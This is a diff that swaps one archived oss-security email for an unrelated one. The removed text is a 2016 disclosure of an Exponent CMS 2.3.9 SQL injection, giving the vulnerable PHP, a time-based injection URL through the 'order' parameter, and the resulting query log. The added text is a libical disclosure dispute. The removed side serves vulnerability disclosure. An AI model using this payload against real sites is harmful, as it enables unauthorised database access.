@@ -1,107 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/19/4
-Message-ID: <CAJ8RaNbqj2sOAtx51OZ7_7O2TbP2q8+O=7G14xjXz5bcAM1NcQ@mail.gmail.com>
-Date: Mon, 19 Sep 2016 08:08:32 -0400
-From: 王禹哲 <0xtom4to@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/06/25/6
+Message-Id: <C5D9B35B-045D-41DD-9419-14D50BE494BA@gmail.com>
+Date: Sat, 25 Jun 2016 10:41:16 -0500
+From: Brandon Perry <bperry.volatile@...il.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: Exponent CMS 2.3.9 SQL injection vulnerabilities
+Cc: fulldisclosure@...lists.org
+Subject: Re: libical 0.47 SEGV on unknown address
 Content-Type: text/plain; charset=utf-8
 
-Author: Tomato, jianing.wang@...itin.com
 
-Date:2016–09–19
+> On Jun 25, 2016, at 10:34 AM, Alan Coopersmith <alan.coopersmith@...cle.com> wrote:
+> 
+> On 06/24/16 06:54 AM, Brandon Perry wrote:
+>> I am posting this to Full Disclosure/OSS instead of reporting it because I have
+>> opened a handful of libical bugs in the Mozilla bug tracker, alerted
+>> security@...illa.org <mailto:security@...illa.org>, and worked to show how and
+>> where to reproduce the bugs in Thunderbird, but Mozilla hasn’t shown any care at
+>> all about the bugs. Perhaps if I give a sample to the community of the bugs in
+>> the bug reports, Mozilla will take the bug reports more seriously. This bug
+>> attached had not been reported yet.
+> 
+> Did you report them to libcial upstream?  http://libical.github.io/libical/ <http://libical.github.io/libical/>
 
-Version: 2.3.9 and earlier
+I had initially asked for contact information regarding reporting potentially sensitive security test cases, but after a couple of days, I decided to look into another product that I figured would have more visibility and more power to get things fixed.
 
-/exponent–2.3.9/framework/core/subsystems/expPaginator.php
-
-
-if (strstr($this->order," ")) {
-            $orderby = explode(" ",$this->order);
-            $this->order = $orderby[0];
-            $this->order_direction = $orderby[1];
-        }
-        if ($this->dontsort)
-            $sort = null;
-        else
-            $sort = $this->order.' '.$this->order_direction;
-
-        // figure out how many records we're dealing with & grab the records
-        //if (!empty($this->records)) { //from Merge <~~ this doesn't
-work. Could be empty, but still need to hit.
-        if (!empty($this->categorize))
-            $limit = null;
-        else
-            $limit = $this->limit;
-
-        if (isset($params['records'])) { // if we pass
-$params['records'], we WANT to hit this
-            // sort the records that were passed in to us
-            if (!empty($sort))
-                usort($this->records,array('expPaginator',
-strtolower($this->order_direction)));
-//          $this->total_records = count($this->records);
-        } elseif (!empty($class)) { //where clause     //FJD: was
-$this->class, but wasn't working...
-            $this->total_records = $class->find('count', $this->where);
-            $this->records = $class->find('all', $this->where, $sort,
-$limit, $this->start);
-        } elseif (!empty($this->where)) { //from Merge....where clause
-            $this->total_records = $class->find('count', $this->where);
-            $this->records = $class->find('all', $this->where, $sort,
-$limit, $this->start);
-        } else { //sql clause  //FIXME we don't get attachments in this approach
-            //$records = $db->selectObjectsBySql($this->sql);
-            //$this->total_records = count($records);
-            //this is MUCH faster if you supply a proper count_sql
-param using a COUNT() function; if not,
-            //we'll run the standard sql and do a queryRows with it
-            //$this->total_records = $this->count_sql == '' ?
-$db->queryRows($this->sql) : $db->selectValueBySql($this->count_sql);
-//From Merge
-
-//          $this->total_records =
-$db->countObjectsBySql($this->count_sql);
-//$db->queryRows($this->sql); //From most current Trunk
-
-            if (!empty($sort)) $this->sql .= ' ORDER BY '.$sort;
+https://github.com/libical/libical/issues/235 <https://github.com/libical/libical/issues/235>
+> 
+>> My roommate mentioned Thunderbird being a second-class citizen in the Mozilla
+>> world, so if this is the case, this should be made explicit in regards to bug
+>> bounty expectations.
+> 
+> While Thunderbird is still a beloved child of Mozilla, it's been told it's time
+> to move out of its parents house and find its own sources of income/support:
+> 
+> https://groups.google.com/d/msg/mozilla.governance/kAyVlhfEcXg/Eqyx1X62BQAJ
+> https://blog.mozilla.org/thunderbird/2015/12/thunderbird-active-daily-inquiries-surpass-10-million/
+> 
+> --
+> 	-Alan Coopersmith-              alan.coopersmith@...cle.com
+> 	 Oracle Solaris Engineering - http://blogs.oracle.com/alanc
 
 
-i can controller $order ,i can use this parameter to sql injection
+Content of type "text/html" skipped
 
-such as
-
-exponent–2.3.9/framework/modules/company/controllers/companyController.php
-
-```php function showall() { expHistory::set(‘viewable’, $this->params);
-$page = new expPaginator(array( ‘model’=>$this->basemodel_name, ‘where’=>1,
-‘limit’=>(isset($this->params[‘limit’]) && $this->config[‘limit’] != ’‘) ?
-$this->params[‘limit’] : 10, ‘order’=>isset($this->params[‘order’]) ?
-$this->params[‘order’] : ‘rank’, ‘page’=>(isset($this->params[‘page’]) ?
-$this->params[‘page’] : 1), ‘controller’=>$this->baseclassname,
-‘action’=>$this->params[‘action’], ‘columns’=>array(
-gt(‘Manufacturer’)=>’title’, gt(‘Website’)=>’website’ ), ));
-
-    assign_to_template(array(
-        'page'=>$page,
-        'items'=>$page->records
-    ));
-}
-```
-
-the poc is
-
-http://127.0.0.1/exponent–2.3.9/index.php?controller=company&action=showall&limit=1&order=(select/*
-*/*/*/from/*/(select/**/sleep(5))x)%23
-
-in the mysql log we can see this
-
-SELECT * FROM exponent_companies WHERE 1 ORDER BY
-(select/**/*/*/from/*/(select/**/sleep(5))x)#
-ASC LIMIT 0,10
-
-Could you assign CVE id for this?
-
-Regards, Tomato
-
+Download attachment "signature.asc" of type "application/pgp-signature" (843 bytes)
